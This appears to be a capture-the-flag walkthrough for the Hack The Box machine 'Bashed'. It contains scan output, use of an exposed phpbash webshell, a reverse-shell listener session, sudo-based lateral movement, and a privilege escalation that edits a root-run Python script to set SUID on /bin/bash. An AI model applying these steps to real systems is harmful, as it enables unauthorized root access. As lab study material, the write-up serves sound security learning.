
### Initial access
Nmap
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

```

Dir scan
```
301      GET        9l       28w      312c http://10.129.38.136/php => http://10.129.38.136/php/
200      GET        0l        0w        0c http://10.129.38.136/php/sendMail.php
301      GET        9l       28w      312c http://10.129.38.136/css => http://10.129.38.136/css/
301      GET        9l       28w      312c http://10.129.38.136/dev => http://10.129.38.136/dev/
200      GET        1l      255w     4559c http://10.129.38.136/dev/phpbash.min.php
200      GET      216l      489w     8151c http://10.129.38.136/dev/phpbash.php

```

We have webshell

![[Assets/Pasted image 20260912190004.png]]
We usin g busybox to get revshell
```
┌──(kali㉿kali)-[~/HTB/Bashed]
└─$ penelope --oscp-safe --no-log -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => bashed 10.129.38.136 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@bashed:/home/scriptmanager$ 

```
### Lateral Movement
Read linpeas
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                              
Matching Defaults entries for www-data on bashed:                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

```
www-data@bashed:/tmp$ sudo -u scriptmanager bash
scriptmanager@bashed:/tmp$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
scriptmanager@bashed:/tmp$ 

```
### Priv escalation
After run linpeas we see the folder and we see that the file test.txt is under root which the test script is excute by root.
```
scriptmanager@bashed:/scripts$ ls -la 
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep 12 05:53 test.txt
scriptmanager@bashed:/scripts$ cat test.py 
f = open("test.txt", "w")
f.write("testing 123!")
f.close

```

```
scriptmanager@bashed:/scripts$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ cat  test.py 
#!/usr/bin/env python3
import os, stat
os.chmod("/bin/bash", os.stat("/bin/bash").st_mode | stat.S_ISUID)

f = open("test.txt", "w")
f.write("testing 123!")
f.close
```